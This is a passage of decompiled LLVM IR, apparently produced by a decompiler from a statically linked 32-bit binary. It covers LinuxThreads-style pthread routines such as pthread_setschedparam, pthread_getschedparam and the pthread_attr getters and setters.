  %v3_804ded5 = call i32 @waitpid(i32 %v0_804decf, i32 0, i32 -2147483648)
  store i32 %v3_804ded5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dedd

dec_label_pc_804dedd:                             ; preds = %dec_label_pc_804debf.dec_label_pc_804dedd_crit_edge, %dec_label_pc_804dec7
  %v0_804dee0 = load i32, i32* @global_var_806339c.159, align 4
  %v1_804dee6 = call i32 @__GI__exit(i32 %v0_804dee0)
  unreachable

dec_label_pc_804deeb:                             ; preds = %dec_label_pc_804deb6
  %v1_804deeb = add i32 %v0_804defd, 66
  %v2_804deeb = inttoptr i32 %v1_804deeb to i8*
  %v3_804deeb = load i8, i8* %v2_804deeb, align 1
  %v4_804deeb = icmp eq i8 %v3_804deeb, 0
  br i1 %v4_804deeb, label %dec_label_pc_804df23, label %dec_label_pc_804def1

dec_label_pc_804def1:                             ; preds = %dec_label_pc_804deeb
  %v1_804def1 = add i32 %v0_804defd, 64
  %v2_804def1 = inttoptr i32 %v1_804def1 to i8*
  %v3_804def1 = load i8, i8* %v2_804def1, align 1
  %v4_804def1 = icmp eq i8 %v3_804def1, 0
  %v1_804def5 = icmp eq i1 %v4_804def1, false
  br i1 %v1_804def5, label %dec_label_pc_804df23, label %dec_label_pc_804def7

dec_label_pc_804def7:                             ; preds = %dec_label_pc_804def1
  %v1_804def7 = add i32 %v0_804defd, 65
  %v2_804def7 = inttoptr i32 %v1_804def7 to i8*
  %v3_804def7 = load i8, i8* %v2_804def7, align 1
  %v12_804def7 = icmp eq i8 %v3_804def7, 1
  %v1_804defb = icmp eq i1 %v12_804def7, false
  br i1 %v1_804defb, label %dec_label_pc_804df0b, label %dec_label_pc_804defd

dec_label_pc_804defd:                             ; preds = %dec_label_pc_804def7
  %v2_804deff = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804deff, i32* %eax.global-to-local, align 4
  %v2_804df06 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_804deff)
  store i32 %v2_804df06, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df0b

dec_label_pc_804df0b:                             ; preds = %dec_label_pc_804def7, %dec_label_pc_804defd
  %stack_var_-40.0 = phi i32 [ %tmp10, %dec_label_pc_804def7 ], [ %v2_804deff, %dec_label_pc_804defd ]
  %v0_804df12 = phi i32 [ %v0_804defd, %dec_label_pc_804def7 ], [ %v2_804df06, %dec_label_pc_804defd ]
  %v1_804df0b = add i32 %v0_804df12, 40
  %v2_804df0b = inttoptr i32 %v1_804df0b to i32*
  %v3_804df0b = load i32, i32* %v2_804df0b, align 4
  store i32 %v3_804df0b, i32* @edx, align 4
  %v1_804df0e = icmp eq i32 %v3_804df0b, 0
  br i1 %v1_804df0e, label %dec_label_pc_804df23, label %dec_label_pc_804df12

dec_label_pc_804df12:                             ; preds = %dec_label_pc_804df0b
  store i32 0, i32* %v2_804df0b, align 4
  %v0_804df19 = load i32, i32* %eax.global-to-local, align 4
  %v4_804df1e = call i32 @siglongjmp(i32 %v3_804df0b, i32 1, i32 %v0_804df19, i32 %v0_804df19)
  store i32 %v4_804df1e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df23

dec_label_pc_804df23:                             ; preds = %dec_label_pc_804df0b, %dec_label_pc_804def1, %dec_label_pc_804deeb, %dec_label_pc_804df12
  %stack_var_-40.1 = phi i32 [ %tmp10, %dec_label_pc_804deeb ], [ %tmp10, %dec_label_pc_804def1 ], [ %stack_var_-40.0, %dec_label_pc_804df0b ], [ %stack_var_-40.0, %dec_label_pc_804df12 ]
  store i32 %stack_var_-40.1, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-40.1

; uselistorder directives
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_804defd, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_804de9a, { 1, 0, 2 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 %tmp10, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 7, 3, 4, 5, 0, 6, 8 }
  uselistorder label %dec_label_pc_804df23, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804df0b, { 1, 0 }
  uselistorder label %dec_label_pc_804dedd, { 1, 0 }
  uselistorder label %dec_label_pc_804deb6, { 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804df2a = call i32 @thread_self.7(i32 ptrtoint (i32* @0 to i32))
  store i32 %arg1, i32* @edx, align 4
  %v2_804df33 = add i32 %v1_804df2a, 32
  %v3_804df33 = inttoptr i32 %v2_804df33 to i32*
  store i32 %arg1, i32* %v3_804df33, align 4
  %v1_804df36 = add i32 %v1_804df2a, 36
  %v2_804df36 = inttoptr i32 %v1_804df36 to i32*
  %v3_804df36 = load i32, i32* %v2_804df36, align 4
  %v1_804df39 = icmp eq i32 %v3_804df36, 0
  br i1 %v1_804df39, label %dec_label_pc_804df47, label %dec_label_pc_804df3d

dec_label_pc_804df3d:                             ; preds = %entry
  %v0_804df3d = load i32, i32* @ecx, align 4
  %v4_804df42 = call i32 @siglongjmp(i32 %v3_804df36, i32 1, i32 %v0_804df3d, i32 %v0_804df3d)
  br label %dec_label_pc_804df47

dec_label_pc_804df47:                             ; preds = %entry, %dec_label_pc_804df3d
  %v0_804df4a = phi i32 [ 0, %entry ], [ %v4_804df42, %dec_label_pc_804df3d ]
  ret i32 %v0_804df4a

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder i32 (i32)* @thread_self.7, { 6, 5, 4, 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804df47, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v1_804df50 = call i32 @__libc_pthread_init(i32 0)
  store i32 %v1_804df50, i32* @global_var_80633a0.186, align 32
  ret i32 %v1_804df50
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg3 to i32
  store i32 0, i32* @edx, align 4
  %v0_804df63 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804df71 = urem i32 %arg1, 1024
  %v2_804df76 = mul nuw nsw i32 %v1_804df71, 16
  %v1_804df79 = add i32 %v2_804df76, ptrtoint (i32* @global_var_805e6a0.146 to i32)
  store i32 %v1_804df79, i32* @esi, align 4
  store i32 %v1_804df79, i32* @eax, align 4
  %v1_804df81 = call i32 @__pthread_lock(i32 %v0_804df63)
  %v0_804df86 = load i32, i32* @esi, align 4
  %v1_804df86 = add i32 %v0_804df86, 8
  %v2_804df86 = inttoptr i32 %v1_804df86 to i32*
  %v3_804df86 = load i32, i32* %v2_804df86, align 4
  store i32 %v3_804df86, i32* @ebx, align 4
  %v1_804df89 = icmp eq i32 %v3_804df86, 0
  br i1 %v1_804df89, label %dec_label_pc_804df92, label %dec_label_pc_804df8d

dec_label_pc_804df8d:                             ; preds = %entry
  %v1_804df8d = add i32 %v3_804df86, 16
  %v2_804df8d = inttoptr i32 %v1_804df8d to i32*
  %v3_804df8d = load i32, i32* %v2_804df8d, align 4
  %v4_804df8d = load i32, i32* @edi, align 4
  %v15_804df8d = icmp eq i32 %v3_804df8d, %v4_804df8d
  br i1 %v15_804df8d, label %dec_label_pc_804dfa2, label %dec_label_pc_804df92

dec_label_pc_804df92:                             ; preds = %dec_label_pc_804df8d, %entry
  %v1_804df96 = inttoptr i32 %v0_804df86 to i32*
  %v2_804df96 = call i32 @__pthread_unlock(i32* %v1_804df96)
  br label %dec_label_pc_804dffb

dec_label_pc_804dfa2:                             ; preds = %dec_label_pc_804df8d
  %v1_804dfa8 = add i32 %v3_804df86, 20
  %v2_804dfa8 = inttoptr i32 %v1_804dfa8 to i32*
  %v3_804dfa8 = load i32, i32* %v2_804dfa8, align 4
  %v3_804dfab = call i32 @sched_setscheduler(i32 %v3_804dfa8, i32 %tmp5, i32 %v4_804df8d)
  %v8_804dfb3 = icmp eq i32 %v3_804dfab, -1
  %v1_804dfb4 = icmp eq i1 %v8_804dfb3, false
  br i1 %v1_804dfb4, label %dec_label_pc_804dfc8, label %dec_label_pc_804dfb6

dec_label_pc_804dfb6:                             ; preds = %dec_label_pc_804dfa2
  %v0_804dfb9 = load i32, i32* @esi, align 4
  %v1_804dfba = inttoptr i32 %v0_804dfb9 to i32*
  %v2_804dfba = call i32 @__pthread_unlock(i32* %v1_804dfba)
  %v1_804dfbf = call i32 @__errno_location(i32 %v0_804dfb9)
  %v1_804dfc4 = inttoptr i32 %v1_804dfbf to i32*
  %v2_804dfc4 = load i32, i32* %v1_804dfc4, align 4
  br label %dec_label_pc_804dffb

dec_label_pc_804dfc8:                             ; preds = %dec_label_pc_804dfa2
  %v1_804dfca = icmp eq i32 %arg2, 0
  br i1 %v1_804dfca, label %dec_label_pc_804dfd4, label %dec_label_pc_804dfce

dec_label_pc_804dfce:                             ; preds = %dec_label_pc_804dfc8
  %v2_804dfd2 = load i32, i32* %arg3, align 4
  br label %dec_label_pc_804dfd4

dec_label_pc_804dfd4:                             ; preds = %dec_label_pc_804dfc8, %dec_label_pc_804dfce
  %v0_804dfd7 = phi i32 [ 0, %dec_label_pc_804dfc8 ], [ %v2_804dfd2, %dec_label_pc_804dfce ]
  %v2_804dfd7 = add i32 %v3_804df86, 24
  %v3_804dfd7 = inttoptr i32 %v2_804dfd7 to i32*
  store i32 %v0_804dfd7, i32* %v3_804dfd7, align 4
  %v0_804dfda = load i32, i32* @esi, align 4
  %v1_804dfdb = inttoptr i32 %v0_804dfda to i32*
  %v2_804dfdb = call i32 @__pthread_unlock(i32* %v1_804dfdb)
  %v0_804dfe5 = load i32, i32* @global_var_8062a84.142, align 4
  %v2_804dfe5 = icmp slt i32 %v0_804dfe5, 0
  br i1 %v2_804dfe5, label %dec_label_pc_804dffe, label %dec_label_pc_804dfee

dec_label_pc_804dfee:                             ; preds = %dec_label_pc_804dfd4
  %v3_804dff1 = load i32, i32* %v3_804dfd7, align 4
  %v1_804dff4 = call i32 @__pthread_manager_adjust_prio(i32 %v3_804dff1)
  br label %dec_label_pc_804dffb

dec_label_pc_804dffb:                             ; preds = %dec_label_pc_804dfb6, %dec_label_pc_804df92, %dec_label_pc_804dfee
  %v0_804e0054 = phi i32 [ %v2_804dfc4, %dec_label_pc_804dfb6 ], [ 3, %dec_label_pc_804df92 ], [ 0, %dec_label_pc_804dfee ]
  br label %dec_label_pc_804dffe

dec_label_pc_804dffe:                             ; preds = %dec_label_pc_804dfd4, %dec_label_pc_804dffb
  %v0_804e005 = phi i32 [ 0, %dec_label_pc_804dfd4 ], [ %v0_804e0054, %dec_label_pc_804dffb ]
  ret i32 %v0_804e005

; uselistorder directives
  uselistorder i32 %v4_804df8d, { 1, 0 }
  uselistorder i32 %v3_804df86, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804dffe, { 1, 0 }
  uselistorder label %dec_label_pc_804dffb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804dfd4, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_804e009 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804e013 = urem i32 %arg1, 1024
  %v2_804e018 = mul nuw nsw i32 %v1_804e013, 16
  %v1_804e01b = add i32 %v2_804e018, ptrtoint (i32* @global_var_805e6a0.146 to i32)
  store i32 %v1_804e01b, i32* @ebx, align 4
  store i32 %v1_804e01b, i32* @eax, align 4
  %v1_804e023 = call i32 @__pthread_lock(i32 %v0_804e009)
  %v0_804e028 = load i32, i32* @ebx, align 4
  %v1_804e028 = add i32 %v0_804e028, 8
  %v2_804e028 = inttoptr i32 %v1_804e028 to i32*
  %v3_804e028 = load i32, i32* %v2_804e028, align 4
  %v1_804e02b = icmp eq i32 %v3_804e028, 0
  br i1 %v1_804e02b, label %dec_label_pc_804e034, label %dec_label_pc_804e02f

dec_label_pc_804e02f:                             ; preds = %entry
  %v1_804e02f = add i32 %v3_804e028, 16
  %v2_804e02f = inttoptr i32 %v1_804e02f to i32*
  %v3_804e02f = load i32, i32* %v2_804e02f, align 4
  %v4_804e02f = load i32, i32* @esi, align 4
  %v15_804e02f = icmp eq i32 %v3_804e02f, %v4_804e02f
  br i1 %v15_804e02f, label %dec_label_pc_804e047, label %dec_label_pc_804e034

dec_label_pc_804e034:                             ; preds = %dec_label_pc_804e02f, %entry
  store i32 %v0_804e028, i32* %stack_var_-28, align 4
  %v1_804e038 = inttoptr i32 %v0_804e028 to i32*
  %v2_804e038 = call i32 @__pthread_unlock(i32* %v1_804e038)
  br label %dec_label_pc_804e088

dec_label_pc_804e047:                             ; preds = %dec_label_pc_804e02f
  %v1_804e047 = add i32 %v3_804e028, 20
  %v2_804e047 = inttoptr i32 %v1_804e047 to i32*
  %v3_804e047 = load i32, i32* %v2_804e047, align 4
  store i32 %v3_804e047, i32* @esi, align 4
  store i32 %v0_804e028, i32* %stack_var_-28, align 4
  %v1_804e04e = inttoptr i32 %v0_804e028 to i32*
  %v2_804e04e = call i32 @__pthread_unlock(i32* %v1_804e04e)
  %v0_804e053 = load i32, i32* @esi, align 4
  store i32 %v0_804e053, i32* %stack_var_-28, align 4
  %v1_804e056 = call i32 @sched_getscheduler(i32 %v0_804e053)
  %v10_804e05e = icmp eq i32 %v1_804e056, -1
  store i32 %v1_804e056, i32* @ebx, align 4
  br i1 %v10_804e05e, label %dec_label_pc_804e077, label %dec_label_pc_804e065

dec_label_pc_804e065:                             ; preds = %dec_label_pc_804e047
  %v0_804e065 = load i32, i32* @ecx, align 4
  %v0_804e06b = load i32, i32* @esi, align 4
  store i32 %v0_804e06b, i32* %stack_var_-28, align 4
  %v4_804e06c = call i32 @sched_getparam(i32 %v0_804e06b, i32 %arg3, i32 %v0_804e065, i32 %v0_804e065)
  %v8_804e074 = icmp eq i32 %v4_804e06c, -1
  %v1_804e075 = icmp eq i1 %v8_804e074, false
  br i1 %v1_804e075, label %dec_label_pc_804e080, label %dec_label_pc_804e077

dec_label_pc_804e077:                             ; preds = %dec_label_pc_804e065, %dec_label_pc_804e047
  %v0_804e077 = load i32, i32* %stack_var_-28, align 4
  %v1_804e077 = call i32 @__errno_location(i32 %v0_804e077)
  %v1_804e07c = inttoptr i32 %v1_804e077 to i32*
  %v2_804e07c = load i32, i32* %v1_804e07c, align 4
  br label %dec_label_pc_804e088

dec_label_pc_804e080:                             ; preds = %dec_label_pc_804e065
  %v0_804e084 = load i32, i32* @ebx, align 4
  store i32 %v0_804e084, i32* %arg2, align 4
  br label %dec_label_pc_804e088

dec_label_pc_804e088:                             ; preds = %dec_label_pc_804e077, %dec_label_pc_804e034, %dec_label_pc_804e080
  %v0_804e08b = phi i32 [ %v2_804e07c, %dec_label_pc_804e077 ], [ 3, %dec_label_pc_804e034 ], [ 0, %dec_label_pc_804e080 ]
  ret i32 %v0_804e08b

; uselistorder directives
  uselistorder i32 %v1_804e056, { 1, 0 }
  uselistorder i32 %v0_804e028, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804e088, { 2, 0, 1 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg2, 1
  %tmp3 = icmp eq i32 %tmp, 1
  br i1 %tmp3, label %dec_label_pc_804e09d, label %dec_label_pc_804e0a5

dec_label_pc_804e09d:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_804e0a5

dec_label_pc_804e0a5:                             ; preds = %entry, %dec_label_pc_804e09d
  %v0_804e0a5 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804e09d ]
  ret i32 %v0_804e0a5

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e0a5, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_804e0aa = load i32, i32* %arg1, align 4
  %v2_804e0b0 = inttoptr i32 %arg2 to i32*
  store i32 %v2_804e0aa, i32* %v2_804e0b0, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_804e0c1 = icmp ugt i32 %arg2, 2
  br i1 %v6_804e0c1, label %dec_label_pc_804e0cc, label %dec_label_pc_804e0c3

dec_label_pc_804e0c3:                             ; preds = %entry
  %v2_804e0c7 = add i32 %arg1, 4
  %v3_804e0c7 = inttoptr i32 %v2_804e0c7 to i32*
  store i32 %arg2, i32* %v3_804e0c7, align 4
  br label %dec_label_pc_804e0cc

dec_label_pc_804e0cc:                             ; preds = %entry, %dec_label_pc_804e0c3
  %v0_804e0cc = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804e0c3 ]
  ret i32 %v0_804e0cc

; uselistorder directives
  uselistorder label %dec_label_pc_804e0cc, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804e0d1 = add i32 %arg1, 4
  %v2_804e0d1 = inttoptr i32 %v1_804e0d1 to i32*
  %v3_804e0d1 = load i32, i32* %v2_804e0d1, align 4
  store i32 %v3_804e0d1, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg2, 1
  %tmp3 = icmp eq i32 %tmp, 1
  br i1 %tmp3, label %dec_label_pc_804e0eb, label %dec_label_pc_804e0f4

dec_label_pc_804e0eb:                             ; preds = %entry
  %v2_804e0ef = add i32 %arg1, 12
  %v3_804e0ef = inttoptr i32 %v2_804e0ef to i32*
  store i32 %arg2, i32* %v3_804e0ef, align 4
  br label %dec_label_pc_804e0f4

dec_label_pc_804e0f4:                             ; preds = %entry, %dec_label_pc_804e0eb
  %v0_804e0f4 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804e0eb ]
  ret i32 %v0_804e0f4

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e0f4, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804e0f9 = add i32 %arg1, 12
  %v2_804e0f9 = inttoptr i32 %v1_804e0f9 to i32*
  %v3_804e0f9 = load i32, i32* %v2_804e0f9, align 4
  store i32 %v3_804e0f9, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v1_804e109 = icmp eq i32 %arg2, 0
  br i1 %v1_804e109, label %dec_label_pc_804e11d, label %dec_label_pc_804e10d

dec_label_pc_804e10d:                             ; preds = %entry
  %v8_804e10d = icmp eq i32 %arg2, 1
  %v1_804e118 = icmp eq i1 %v8_804e10d, false
  %v4_804e118 = select i1 %v1_804e118, i32 22, i32 95
  store i32 %v4_804e118, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e12a

dec_label_pc_804e11d:                             ; preds = %entry
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804e123 = add i32 %arg1, 16
  %v2_804e123 = inttoptr i32 %v1_804e123 to i32*
  store i32 0, i32* %v2_804e123, align 4
  %v0_804e12a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e12a

dec_label_pc_804e12a:                             ; preds = %dec_label_pc_804e10d, %dec_label_pc_804e11d
  %v0_804e12a = phi i32 [ %v4_804e118, %dec_label_pc_804e10d ], [ %v0_804e12a.pre, %dec_label_pc_804e11d ]
  ret i32 %v0_804e12a

; uselistorder directives
  uselistorder label %dec_label_pc_804e12a, { 1, 0 }
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804e131 = add i32 %arg1, 16
  %v2_804e131 = inttoptr i32 %v1_804e131 to i32*
  %v3_804e131 = load i32, i32* %v2_804e131, align 4
  store i32 %v3_804e131, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804e141 = add i32 %arg1, 20
  %v2_804e141 = inttoptr i32 %v1_804e141 to i32*
  %v3_804e141 = load i32, i32* %v2_804e141, align 4
  store i32 %v3_804e141, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804e155 = add i32 %arg1, 28
  %v3_804e155 = inttoptr i32 %v2_804e155 to i32*
  store i32 %arg2, i32* %v3_804e155, align 4
  %v0_804e15a = load i32, i32* %edx.global-to-local, align 4
  %v1_804e15a = add i32 %v0_804e15a, 24
  %v2_804e15a = inttoptr i32 %v1_804e15a to i32*
  store i32 1, i32* %v2_804e15a, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804e166 = add i32 %arg1, 28
  %v2_804e166 = inttoptr i32 %v1_804e166 to i32*
  %v3_804e166 = load i32, i32* %v2_804e166, align 4
  store i32 %v3_804e166, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg2, 16384
  br i1 %tmp, label %dec_label_pc_804e18c, label %dec_label_pc_804e183

dec_label_pc_804e183:                             ; preds = %entry
  %v2_804e187 = add i32 %arg1, 32
  %v3_804e187 = inttoptr i32 %v2_804e187 to i32*
  store i32 %arg2, i32* %v3_804e187, align 4
  br label %dec_label_pc_804e18c

dec_label_pc_804e18c:                             ; preds = %entry, %dec_label_pc_804e183
  %v0_804e18c = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804e183 ]
  ret i32 %v0_804e18c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e18c, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_804e191 = add i32 %arg1, 32
  %v2_804e191 = inttoptr i32 %v1_804e191 to i32*
  %v3_804e191 = load i32, i32* %v2_804e191, align 4
  store i32 %v3_804e191, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e19d = load i32, i32* @ebx, align 4
  store i32 %v0_804e19d, i32* %stack_var_-4, align 4
  %v1_804e1a1 = call i32 @__GI_getpagesize(i32 %v0_804e19d)
  store i32 %tmp1, i32* %ebx.global-to-local, align 4
  store i32 2097152, i32* %edx.global-to-local, align 4
  store i32 0, i32* %arg1, align 4
  %v1_804e1b5 = add i32 %tmp1, 4
  %v2_804e1b5 = inttoptr i32 %v1_804e1b5 to i32*
  store i32 0, i32* %v2_804e1b5, align 4
  %v0_804e1bc = load i32, i32* %edx.global-to-local, align 4
  %v2_804e1bc = sub i32 %v0_804e1bc, %v1_804e1a1
  store i32 %v2_804e1bc, i32* %edx.global-to-local, align 4
  %v1_804e1be = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e1be = add i32 %v1_804e1be, 20
  %v3_804e1be = inttoptr i32 %v2_804e1be to i32*
  store i32 %v1_804e1a1, i32* %v3_804e1be, align 4
  %v0_804e1c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e1c3 = add i32 %v0_804e1c3, 8
  %v2_804e1c3 = inttoptr i32 %v1_804e1c3 to i32*
  store i32 0, i32* %v2_804e1c3, align 4
  %v0_804e1ca = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e1ca = add i32 %v0_804e1ca, 12
  %v2_804e1ca = inttoptr i32 %v1_804e1ca to i32*
  store i32 1, i32* %v2_804e1ca, align 4
  %v0_804e1d1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e1d1 = add i32 %v0_804e1d1, 16
  %v2_804e1d1 = inttoptr i32 %v1_804e1d1 to i32*
  store i32 0, i32* %v2_804e1d1, align 4
  %v0_804e1d8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e1d8 = add i32 %v0_804e1d8, 28
  %v2_804e1d8 = inttoptr i32 %v1_804e1d8 to i32*
  store i32 0, i32* %v2_804e1d8, align 4
  %v0_804e1df = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e1df = add i32 %v0_804e1df, 24
  %v2_804e1df = inttoptr i32 %v1_804e1df to i32*
  store i32 0, i32* %v2_804e1df, align 4
  %v0_804e1e6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e1e6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e1e6 = add i32 %v1_804e1e6, 32
  %v3_804e1e6 = inttoptr i32 %v2_804e1e6 to i32*
  store i32 %v0_804e1e6, i32* %v3_804e1e6, align 4
  %v2_804e1e9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e1e9, i32* %edx.global-to-local, align 4
  %v2_804e1eb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e1eb, i32* %ebx.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804e1a1, { 1, 0 }
  uselistorder i32 2097152, { 3, 0, 2, 1 }
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804e1ee = load i32, i32* @ebx, align 4
  %v1_804e1f2 = call i32 @__GI_getpagesize(i32 %v0_804e1ee)
  %v3_804e1ff = add i32 %arg2, -1
  %v4_804e1ff = add i32 %v3_804e1ff, %v1_804e1f2
  %tmp7 = urem i32 %v4_804e1ff, %v1_804e1f2
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804e212 = sub i32 %v4_804e1ff, %tmp7
  %v2_804e215 = add i32 %arg1, 32
  %v3_804e215 = inttoptr i32 %v2_804e215 to i32*
  %v4_804e215 = load i32, i32* %v3_804e215, align 4
  %v10_804e215 = icmp ult i32 %v4_804e212, %v4_804e215
  %v1_804e218 = icmp eq i1 %v10_804e215, false
  br i1 %v1_804e218, label %dec_label_pc_804e21f, label %dec_label_pc_804e21a

dec_label_pc_804e21a:                             ; preds = %entry
  %v2_804e21a = add i32 %arg1, 20
  %v3_804e21a = inttoptr i32 %v2_804e21a to i32*
  store i32 %v4_804e212, i32* %v3_804e21a, align 4
  %v10_804e21d = load i32, i32* %eax.global-to-local, align 4
  %v11_804e21d = and i32 %v10_804e21d, -256
  store i32 %v11_804e21d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e21f

dec_label_pc_804e21f:                             ; preds = %entry, %dec_label_pc_804e21a
  %v0_804e222 = phi i32 [ 22, %entry ], [ %v11_804e21d, %dec_label_pc_804e21a ]
  ret i32 %v0_804e222

; uselistorder directives
  uselistorder label %dec_label_pc_804e21f, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804e22c = add i32 %arg1, 8
  %v3_804e234 = inttoptr i32 %arg2 to i16*
  %v4_804e234 = call i32 @memcpy(i16* %v3_804e234, i32 %v1_804e22c, i32 4)
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  %v1_804e24d = add i32 %arg1, 4
  %v2_804e24d = inttoptr i32 %v1_804e24d to i32*
  %v3_804e24d = load i32, i32* %v2_804e24d, align 4
  %v1_804e250 = call i32 @sched_get_priority_max(i32 %v3_804e24d)
  store i32 %v1_804e250, i32* @ebx, align 4
  %v0_804e258 = load i32, i32* @esi, align 4
  %v1_804e258 = add i32 %v0_804e258, 4
  %v2_804e258 = inttoptr i32 %v1_804e258 to i32*
  %v3_804e258 = load i32, i32* %v2_804e258, align 4
  %v1_804e25b = call i32 @sched_get_priority_min(i32 %v3_804e258)
  %v0_804e260 = load i32, i32* @edi, align 4
  %v1_804e260 = inttoptr i32 %v0_804e260 to i32*
  %v2_804e260 = load i32, i32* %v1_804e260, align 4
  %v5_804e267 = icmp slt i32 %v2_804e260, %v1_804e25b
  br i1 %v5_804e267, label %dec_label_pc_804e281, label %dec_label_pc_804e269

dec_label_pc_804e269:                             ; preds = %entry
  %v1_804e269 = load i32, i32* @ebx, align 4
  %v8_804e26b = icmp sgt i32 %v2_804e260, %v1_804e269
  br i1 %v8_804e26b, label %dec_label_pc_804e281, label %dec_label_pc_804e26d

dec_label_pc_804e26d:                             ; preds = %dec_label_pc_804e269
  %v0_804e271 = load i32, i32* @esi, align 4
  %v1_804e271 = add i32 %v0_804e271, 8
  %v3_804e275 = inttoptr i32 %v1_804e271 to i16*
